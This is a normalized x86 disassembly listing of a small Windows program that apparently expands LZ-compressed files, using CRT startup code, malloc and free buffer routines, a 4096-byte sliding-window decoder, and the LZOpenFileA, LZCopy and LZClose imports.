+mov ax [ esi + 0x1044 ]
+mov ecx esi
+push eax
+call sub_403080
+movsx ecx bx
+mov [ esi + 0x1046 ] 0x1
+movzx dx [ ecx + esi + 0x8 ]
+push edx
+mov ecx esi
+call sub_403000
+jmp r-xdata
+mov dx di
+inc edi
+cmp dx ax
+jge r-xdata
+mov ecx esi
+call sub_403490
+cmp ax 0xffff
+mov [ esp + 0x18 ] eax
+je r-xdata
+mov ax [ esi + 0x1046 ]
+xor edi edi
+test ax ax
+mov [ esp + 0x14 ] eax
+jle r-xdata
+cmp [ esp + 0x10 ] 0x0
+jg r-xdata
+movsx eax ax
+movsx ecx di
+sub eax ecx
+inc eax
+mov [ esp + 0x14 ] eax
+mov eax [ esp + 0x14 ]
+push ebp
+mov ecx esi
+call sub_402b10
+movsx ecx bp
+cmp bp 0x3b
+lea eax [ ecx + esi ]
+mov cl [ esp + 0x18 ]
+mov [ eax + 0x8 ] cl
+jge r-xdata
+mov edi [ esp + 0x10 ]
+mov ecx esi
+call sub_4030c0
+pop edi
+pop ebx
+mov eax [ esp + 0x14 ]
+dec eax
+mov [ esp + 0x14 ] eax
+jne r-xdata
+push ebx
+mov ecx esi
+call sub_402910
+inc ebp
+mov ecx esi
+and ebp 0xfff
+inc ebx
+and ebx 0xfff
+push ebx
+call sub_402910
+inc edi
+cmp di [ esp + 0x14 ]
+jl r-xdata
+mov [ eax + 0x1008 ] cl
+push ebp
+mov ecx esi
+call sub_402b10
+mov eax [ esp + 0x10 ]
+inc ebp
+and ebp 0xfff
+inc ebx
+and ebx 0xfff
+dec eax
+test ax ax
+mov [ esp + 0x10 ] eax
+je r-xdata
+sub_4032f0
+mov eax [ esp + 0x8 ]
+push ebx
+mov edx ecx
+push esi
+push edi
+mov edi [ edx + 0x8398 ]
+mov ecx [ edx + 0x838c ]
+lea esi [ edi + eax ]
+cmp esi ecx
+jle r-xdata
+mov esi [ edx + 0x8384 ]
+mov ecx eax
+mov ebx ecx
+add esi edi
+mov edi [ esp + 0x10 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+and ecx 0x3
+[ edi ] [ esi ]
+mov ecx [ edx + 0x8398 ]
+pop edi
+add ecx eax
+pop esi
+mov [ edx + 0x8398 ] ecx
+pop ebx
+retn 0x8
+sub ecx edi
+mov eax ecx
+sub_403340
+push ecx
+push ebx
+mov ebx ecx
+push ebp
+mov ebp [ esp + 0x14 ]
+mov eax [ ebx + 0x8388 ]
+push esi
+mov esi [ malloc@IAT ]
+push edi
+cmp [ eax ] 0x0
+jne r-xdata
+mov eax [ ebx + 0x839c ]
+mov ecx [ ebx + 0x8390 ]
+add eax ebp
+cmp eax ecx
+jle r-xdata
+lea eax [ ebp + ebp * 2 ]
+cdq
+sub eax edx
+sar eax 0x1
+add eax 0x400
+push eax
+mov [ ebx + 0x8390 ] eax
+call esi
+mov ecx [ ebx + 0x8388 ]
+add esp 0x4
+mov [ ecx ] eax
+mov edx [ ebx + 0x8388 ]
+mov edi [ edx ]
+test edi edi
+jne r-xdata
+mov edx [ ebx + 0x8388 ]
+mov eax [ ebx + 0x839c ]
+mov esi [ esp + 0x18 ]
+mov ecx ebp
+mov edi [ edx ]
+add edi eax
+mov eax ecx
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+mov eax [ esp + 0x1c ]
+and ecx 0x3
+[ edi ] [ esi ]
+mov ecx [ ebx + 0x839c ]
+mov edx [ ebx + 0x8394 ]
+add ecx eax
+pop edi
+pop esi
+mov [ ebx + 0x839c ] ecx
+pop ebp
+mov [ edx ] ecx
+pop ebx
+pop ecx
+retn 0x8
+lea eax [ eax + eax * 2 ]
+cdq
+sub eax edx
+mov ebp eax
+sar ebp 0x1
+add ebp 0x400
+push ebp
+call esi
+mov edx eax
+add esp 0x4
+test edx edx
+mov [ esp + 0x10 ] edx
+jne r-xdata
+mov ecx [ ebx + 0x8390 ]
+xor eax eax
+mov edx ecx
+shr ecx 0x2
+[ edi ]
+mov ecx edx
+and ecx 0x3
+[ edi ]
+pop edi
+pop esi
+pop ebp
+or eax 0xffffffff
+pop ebx
+pop ecx
+retn 0x8
+mov ecx ebp
+xor eax eax
+mov esi ecx
+mov edi edx
+shr ecx 0x2
+[ edi ]
+mov ecx esi
+and ecx 0x3
+[ edi ]
+mov ecx [ ebx + 0x839c ]
+mov eax [ ebx + 0x8388 ]
+mov edi edx
+mov edx ecx
+mov esi [ eax ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx edx
+and ecx 0x3
+[ edi ] [ esi ]
+mov eax [ ebx + 0x8388 ]
+mov ecx [ eax ]
+push ecx
+call [ free@IAT ]
+mov edx [ ebx + 0x8388 ]
+mov eax [ esp + 0x14 ]
+add esp 0x4
+mov [ edx ] eax
+mov [ ebx + 0x8390 ] ebp
+mov ebp [ esp + 0x1c ]
+pop edi
+pop esi
+pop ebp
+or eax 0xffffffff
+pop ebx
+pop ecx
+retn 0x8
+sub_403490
+push ecx
+lea eax [ esp ]
+push 0x1
+push eax
+mov [ esp + 0x8 ] 0x0
+call sub_4032f0
+cmp eax 0x1
+je r-xdata
+mov eax [ esp ]
+pop ecx
+retn
+or eax 0xffffffff
+pop ecx
+retn
+sub_4034e0
+mov eax [ esp + 0x4 ]
+mov edx [ esp + 0x8 ]
+mov [ ecx + 0x8384 ] eax
+mov eax [ esp + 0x10 ]
+push esi
+mov esi [ esp + 0x10 ]
+mov [ ecx + 0x8394 ] eax
+xor eax eax
+mov [ ecx + 0x838c ] edx
+mov [ ecx + 0x8388 ] esi
+mov [ ecx + 0x8398 ] eax
+mov [ ecx + 0x839c ] eax
+mov [ esi ] eax
+mov esi [ ecx + 0x8394 ]
+mov [ esi ] eax
+mov [ ecx + 0x8376 ] ax
+mov [ ecx + 0x8378 ] al
+mov [ ecx + 0x837a ] ax
+mov [ ecx + 0x837c ] al
+mov [ ecx ] edx
+call sub_4030f0
+xor eax eax
+pop esi
+retn 0x10
+sub_403590
+push ecx
+cmp eax 0x1000
+lea ecx [ esp + 0x8 ]
+jb r-xdata
+sub ecx eax
+mov eax esp
+test [ ecx ] eax
+mov esp ecx
+mov ecx [ eax ]
+mov eax [ eax + 0x4 ]
+push eax
+retn
+sub ecx 0x1000
+sub eax 0x1000
+test [ ecx ] eax
+cmp eax 0x1000
+jae r-xdata
+_start
+push ebp
+mov ebp esp
+push 0xffffffff
+push r--data
+push _except_handler3
+mov eax [ fs : 0x0 ]
+push eax
+mov [ fs : 0x0 ] esp
+sub esp 0x68
+push ebx
+push esi
+push edi
+mov [ ebp - 0x18 ] esp
+xor ebx ebx
+mov [ ebp - 0x4 ] ebx
+push 0x2
+call [ __set_app_type@IAT ]
+pop ecx
+or [ rw-data ] 0xffffffff
+or [ rw-data ] 0xffffffff
+call [ __p__fmode@IAT ]
+mov ecx [ rw-data ]
+mov [ eax ] ecx
+call [ __p__commode@IAT ]
+mov ecx [ rw-data ]
+mov [ eax ] ecx
+mov eax [ _adjust_fdiv@IAT ]
+mov eax [ eax ]
+mov [ rw-data ] eax
+call sub_40373f
+cmp [ rw-data ] ebx
+jne r-xdata
+call sub_40372a
+push rw-data
+push rw-data
+call _initterm
+mov eax [ rw-data ]
+mov [ ebp - 0x6c ] eax
+lea eax [ ebp - 0x6c ]
+push eax
+push [ rw-data ]
+lea eax [ ebp - 0x64 ]
+push eax
+lea eax [ ebp - 0x70 ]
+push eax
+lea eax [ ebp - 0x60 ]
+push eax
+call [ __getmainargs@IAT ]
+push rw-data
+push rw-data
+call _initterm
+add esp 0x24
+mov eax [ _acmdln@IAT ]
+mov esi [ eax ]
+mov [ ebp - 0x74 ] esi
+cmp [ esi ] 0x22
+jne r-xdata
+push sub_40373c
+call [ __setusermatherr@IAT ]
+pop ecx
+cmp [ esi ] 0x20
+jbe r-xdata
+inc esi
+mov [ ebp - 0x74 ] esi
+mov al [ esi ]
+cmp al bl
+je r-xdata
+mov al [ esi ]
+cmp al bl
+je r-xdata
+inc esi
+mov [ ebp - 0x74 ] esi
+jmp r-xdata
+cmp [ esi ] 0x22
+jne r-xdata
+cmp al 0x22
+jne r-xdata
+mov [ ebp - 0x30 ] ebx
+lea eax [ ebp - 0x5c ]
+push eax
+call [ GetStartupInfoA@IAT ]
+test [ ebp - 0x30 ] 0x1
+je r-xdata
+cmp al 0x20
+jbe r-xdata
+inc esi
+mov [ ebp - 0x74 ] esi
+push 0xa
+pop eax
+movzx eax [ ebp - 0x2c ]
+jmp r-xdata
+push eax
+push esi
+push ebx
+push ebx
+call [ GetModuleHandleA@IAT ]
+push eax
+call sub_4028c0
+mov [ ebp - 0x68 ] eax
+push eax
+call [ exit@IAT ]
+sub_4028c0
+mov eax [ esp + 0xc ]
+push eax
+call sub_402690
+pop ecx
+retn 0x10
+sub_4028d0
+mov eax ecx
+retn
+sub_4028e0
+mov edx ecx
+push edi
+mov ecx 0x80
+mov eax 0x10001000
+lea edi [ edx + 0x504c ]
+[ edi ]
+lea edi [ edx + 0x524c ]
+mov ecx 0x800
+[ edi ]
+pop edi
+retn
+sub_4034c0
+lea eax [ esp + 0x4 ]
+push 0x1
+push eax
+call sub_403340
+dec eax
+neg eax
+sbb eax eax
+retn 0x4
+sub_403550
+push esi
+mov esi [ esp + 0x8 ]
+mov eax [ esi ]
+push eax
+call [ free@IAT ]
+add esp 0x4
+mov [ esi ] 0x0
+xor eax eax
+pop esi
+retn 0x4
+LZClose
+jmp [ LZClose@IAT ]
+LZCopy
+jmp [ LZCopy@IAT ]
+LZOpenFileA
+jmp [ LZOpenFileA@IAT ]
+sub_403711
+mov esp [ ebp - 0x18 ]
+push [ ebp - 0x78 ]
+call [ _exit@IAT ]
+int3
+_XcptFilter
+jmp [ _XcptFilter@IAT ]
+_initterm
+jmp [ _initterm@IAT ]
+sub_40372a
+push 0x30000
+push 0x10000
+call _controlfp
+pop ecx
+pop ecx
+retn
+sub_40373c
+xor eax eax
+retn
+sub_40373f
+retn
+_except_handler3
+jmp [ _except_handler3@IAT ]
+_controlfp
+jmp [ _controlfp@IAT ]
